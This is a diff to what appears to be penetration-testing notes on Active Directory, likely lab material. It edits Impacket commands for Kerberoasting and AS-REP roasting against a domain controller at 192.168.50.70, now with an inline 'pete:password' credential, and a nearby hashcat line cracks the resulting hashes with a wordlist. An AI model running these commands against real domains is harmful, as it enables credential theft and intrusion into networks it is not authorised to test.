@@ -201,7 +201,7 @@ Restore-AdObject -Identity ""
 #### Impacket
 
 ```bash
-impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete:password
 ```
 
 ```powershell
@@ -212,7 +212,7 @@ hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/shar
 ### AS-Rep Roasting
 
 ```bash
-impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete:password
 ```
 
 ```powershell
